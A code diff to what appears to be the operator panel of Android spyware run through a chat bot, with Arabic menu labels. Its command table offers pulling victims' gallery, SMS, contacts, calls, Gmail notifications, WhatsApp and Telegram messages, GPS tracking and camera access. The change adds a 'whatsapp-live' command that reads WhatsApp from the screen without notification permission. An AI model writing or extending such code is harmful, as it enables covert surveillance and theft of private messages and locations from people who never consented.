@@ -218,6 +218,7 @@ COMMANDS = {
     "gallery":        {"category": "data",   "label": "🖼 المعرض",            "description": "سحب صور المعرض",          "needs_param": False},
     "gmail":          {"category": "data",   "label": "📧 Gmail",            "description": "إشعارات Gmail",           "needs_param": False},
     "whatsapp-messages": {"category": "data", "label": "💬 واتساب",        "description": "سحب رسائل الواتساب",      "needs_param": False},
+    "whatsapp-live":     {"category": "data", "label": "💬 واتساب مباشر",  "description": "قراءة واتساب من الشاشة (بدون إذن إشعارات)", "needs_param": False},
     "telegram-messages": {"category": "data", "label": "✈️ تيليجرام",      "description": "سحب رسائل تيليجرام",      "needs_param": False},
     "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
     # camera
@@ -411,7 +412,8 @@ def data_keyboard(did):
     kb.add(_cbtn(did,"contacts"), _cbtn(did,"all-sms"))
     kb.add(_cbtn(did,"calls"), _cbtn(did,"apps"))
     kb.add(_cbtn(did,"gallery"), _cbtn(did,"gmail"))
-    kb.add(_cbtn(did,"whatsapp-messages"), _cbtn(did,"telegram-messages"))
+    kb.add(_cbtn(did,"whatsapp-messages"), _cbtn(did,"whatsapp-live"))
+    kb.add(_cbtn(did,"telegram-messages"))
     kb.add(_cbtn(did,"get-location"))
     kb.add(_back(did))
     return kb
